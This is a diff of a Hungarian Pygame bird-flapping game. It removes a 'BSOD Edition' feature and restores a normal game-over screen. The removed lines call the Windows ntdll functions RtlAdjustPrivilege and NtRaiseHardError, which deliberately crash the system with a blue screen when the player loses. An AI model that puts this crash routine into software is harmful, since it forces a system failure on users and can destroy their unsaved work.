@@ -1,11 +1,5 @@
 import pygame, gif_pygame
 import random
-from ctypes import windll
-from ctypes import c_int
-from ctypes import c_uint
-from ctypes import c_ulong
-from ctypes import POINTER
-from ctypes import byref
 
 pygame.init()
 
@@ -36,7 +30,7 @@ bgm.set_volume(0.1)
 bgm.play(-1)
 
 pygame.display.set_icon(BIRDIMG)
-pygame.display.set_caption("Ugráló Madár - BSOD")
+pygame.display.set_caption("Ugráló Madár")
 
 FEHER = (255, 255, 255)
 KEK = (200, 200, 255)
@@ -259,24 +253,17 @@ def game_loop():
             spritenum.render_text(screen, f"{pont}", W // 2 - text_width // 2, 20)
         else:
             screen.fill(FEHER)
+            screen.blit(BG_GIF.blit_ready(), (0, 0))
 
-            ## ggwp
-            windll.ntdll.RtlAdjustPrivilege(
-                c_uint(19), 
-                c_uint(1), 
-                c_uint(0), 
-                byref(c_int())
-            )
-            windll.ntdll.NtRaiseHardError(
-                c_ulong(0xC000007B), 
-                c_ulong(0), 
-                POINTER(c_int)(), 
-                POINTER(c_int)(), 
-                c_uint(6), 
-                byref(c_uint())
+            screen.blit(
+                GAMEOVER_GIF.blit_ready(),
+                (-20, H // 2 - GAMEOVER_GIF.get_size()[1] // 2 - 50),
             )
 
-
+            font = pygame.font.SysFont("Comic Sans MS", 20)
+            text = font.render("R az újrakezdéshez", True, FEKETE)
+            text_rect = text.get_rect(center=(W // 2, H // 2 + 100))
+            screen.blit(text, text_rect)
 
         pygame.display.flip()
 
@@ -301,10 +288,6 @@ def menu_screen():
         text = font.render("Nyomj egy gombot!", True, FEKETE)
         text_rect = text.get_rect(center=(W // 2, H // 2))
         screen.blit(text, text_rect)
-
-        textbsod = font.render("BSOD Edition", True, FEKETE)
-        textbsod_rect = textbsod.get_rect(center=(W // 2, H // 2 + 50))
-        screen.blit(textbsod, textbsod_rect)
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
